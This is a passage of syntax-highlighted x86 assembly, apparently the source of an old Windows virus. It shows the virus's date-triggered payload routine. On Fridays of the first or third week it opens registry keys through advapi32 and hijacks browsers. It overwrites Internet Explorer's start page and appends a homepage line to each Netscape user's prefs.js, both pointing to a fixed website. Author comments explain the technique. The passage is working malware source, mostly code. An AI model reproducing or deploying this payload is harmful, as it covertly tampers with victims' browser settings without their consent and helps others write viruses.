                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetSystemTime</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get date and time</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DayOfWeek</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">  </span><span class="sc1">; Friday?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfPayload</span><span class="sc0">                 </span><span class="sc1">; If not, end</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Day</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">   </span><span class="sc1">; First week of the month?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@DoPayload</span><span class="sc0">               </span><span class="sc1">; If not, end</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Day</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">  </span><span class="sc1">; Second week discarded</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@EndOfPayload</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Day</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">  </span><span class="sc1">; Third week of the month?</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">    </span><span class="sc5">@@EndOfPayload</span><span class="sc0">            </span><span class="sc1">; If not, end</span><span class="sc0">
         </span><span class="sc5">@@DoPayload</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; We load ADVAPI32.DLL. It's normally loaded, but in this way we'll get</span><span class="sc0">
    </span><span class="sc1">; the module handle, and just in case if it's not loaded.</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegistryFunctions</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EndOfPayload</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyInternetExplorer</span><span class="sc0">  </span><span class="sc1">; Self-explanatory names ;)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyNetscapeNavigator</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleADVAPI32</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_FreeLibrary</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">@@EndOfPayload</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;;; Registry functions</span><span class="sc0">
</span><span class="sc5">RegistryDLL</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'advapi32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASC_RegistryFunctions</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">ASC_RegOpenKeyExA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RegOpenKeyExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASC_RegCloseKey</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RegCloseKey'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASC_RegSetValueExA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RegSetValueExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASC_RegEnumKeyA</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RegEnumKeyA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASC_RegQueryValueExA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RegQueryValueExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ASC_RegEnumValueA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RegEnumValueA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">HandleADVAPI32</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">HandleADVAPI32</span><span class="sc0">
</span><span class="sc5">HandleOpenedKey</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_RegistryFunctions</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">RVA_RegOpenKeyExA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_RegCloseKey</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_RegSetValueExA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_RegEnumKeyA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_RegQueryValueExA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_RegEnumValueA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; This function modifies the start page of Internet Explorer. The easiest</span><span class="sc0">
</span><span class="sc1">;; one, not as much as complicated to get as the Netscape one.</span><span class="sc0">
</span><span class="sc5">ModifyInternetExplorer</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IExplorerKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CURRENT_USER</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">; This just opened:</span><span class="sc0">
        </span><span class="sc1">; HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">       </span><span class="sc1">; End if error</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">LongNombrePagina</span><span class="sc0">  </span><span class="sc1">; Store the size of the new value</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pagina</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Store the address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; Some necessary values</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">IExplorerValue</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Store the address of the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; value</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Now the handle...</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegSetValueExA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ...and change it</span><span class="sc0">
                </span><span class="sc1">; If error, we close. If not, we close :)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegCloseKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close key handle</span><span class="sc0">
       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ModifyInternetExplorer</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This is the page to set</span><span class="sc0">
</span><span class="sc5">Pagina</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'http://www.thehungersite.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">LongNombrePagina</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Pagina</span><span class="sc0">

</span><span class="sc1">;; This is the path into the registry to set the page to. I don't think this</span><span class="sc0">
</span><span class="sc1">;; key will change in the future, since many programs use it to set its own</span><span class="sc0">
</span><span class="sc1">;; start page.</span><span class="sc0">
</span><span class="sc5">IExplorerKey</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Software\Microsoft\Internet Explorer\Main'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IExplorerValue</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Start Page'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; The difficult one. Well, it's not difficult when you see it made, but it's</span><span class="sc0">
</span><span class="sc1">;; complicated to get. Since there isn't any registry key to set the start</span><span class="sc0">
</span><span class="sc1">;; page, I had to search the autoconfig (PREFS.JS) and invent a manner of</span><span class="sc0">
</span><span class="sc1">;; modifying it without many problems. I tried to map that file and move the</span><span class="sc0">
</span><span class="sc1">;; whole text after the java function that sets the start page, to make a hole</span><span class="sc0">
</span><span class="sc1">;; big enough to set the function (if the old start page were bigger, you can</span><span class="sc0">
</span><span class="sc1">;; fill with spaces), but that was a pain in the ass. Then, after a good men-</span><span class="sc0">
</span><span class="sc1">;; tal exercise :), I tried the trick I use now. Since the file is a java file</span><span class="sc0">
</span><span class="sc1">;; setting values, if you add a line at the end setting a new value, you over-</span><span class="sc0">
</span><span class="sc1">;; write the last value. It's like doing MOV AX,1234 and later MOV AX,2345 (or</span><span class="sc0">
</span><span class="sc1">;; the C equivalent).</span><span class="sc0">
</span><span class="sc5">ModifyNetscapeNavigator</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
      </span><span class="sc1">; This variable is used for RegEnumKeyA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SubkeyIndex</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">@@LoopOpeningSubkeys</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NetscapeKeyEnd</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Put this to 0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NetscapeKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegOpenKeyExA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">; Here, we opened the key:</span><span class="sc0">
        </span><span class="sc1">; HKEY_LOCAL_MACHINE\Software\Netscape\Netscape Navigator\Users'</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">         </span><span class="sc1">; Exit, then</span><span class="sc0">

        </span><span class="sc1">; We get the subkeys in the recently opened key. That are the users</span><span class="sc0">
        </span><span class="sc1">; registered on the Netscape Navigator. It's like making FindFirstFile</span><span class="sc0">
        </span><span class="sc1">; and FindNextFile in a directory, but easier, since we use an index</span><span class="sc0">
        </span><span class="sc1">; to get the relative key.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReceivingBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SubkeyIndex</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegEnumKeyA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Error getting subkey?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfKeys</span><span class="sc0">  </span><span class="sc1">; If error, exit</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NetscapeKeyEnd</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc13">'\' ; Put this there
</span><span class="sc0">                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegCloseKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close key (I know</span><span class="sc0">
                                            </span><span class="sc1">; that maybe is a foolness, but</span><span class="sc0">
                                            </span><span class="sc1">; I did it by a reason. I don't</span><span class="sc0">
                                            </span><span class="sc1">; remember it, but there is a</span><span class="sc0">
                                            </span><span class="sc1">; reason :).</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">KEY_ALL_ACCESS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NetscapeKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_LOCAL_MACHINE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegOpenKeyExA</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Open the retrieved</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">; subkey</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LongBuffer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LongBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReceivingBuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NetscapeValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegQueryValueExA</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc1">; Now we get the value of "DirRoot", where the directory of this user</span><span class="sc0">
         </span><span class="sc1">; is specified.</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@EndOfKeys</span><span class="sc0"> </span><span class="sc1">; Exit, then</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ModifyPrefs</span><span class="sc0">  </span><span class="sc1">; Add the "magic" line to PREFS.JS</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegCloseKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close the key</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SubkeyIndex</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Increase number for</span><span class="sc0">
                                                    </span><span class="sc1">; enumerating function</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopOpeningSubkeys</span><span class="sc0">     </span><span class="sc1">; Loop</span><span class="sc0">

 </span><span class="sc5">@@EndOfKeys</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HandleOpenedKey</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_RegCloseKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Close Netscape key</span><span class="sc0">
       </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">           </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">ModifyNetscapeNavigator</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SubkeyIndex</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LongBuffer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">LongBuffer2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">LineToAddToPrefs</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc12">'user_pref("browser.startup.homepage", "http://www.thehungersite.com");'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
                </span><span class="sc5">SizeLineToAdd</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">LineToAddToPrefs</span><span class="sc0">

</span><span class="sc5">NetscapePrefsFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'\prefs.js'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc5">SizeNamePrefs</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NetscapePrefsFile</span><span class="sc0">

</span><span class="sc5">NetscapeKey</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">'Software\Netscape\Netscape Navigator\Users\'
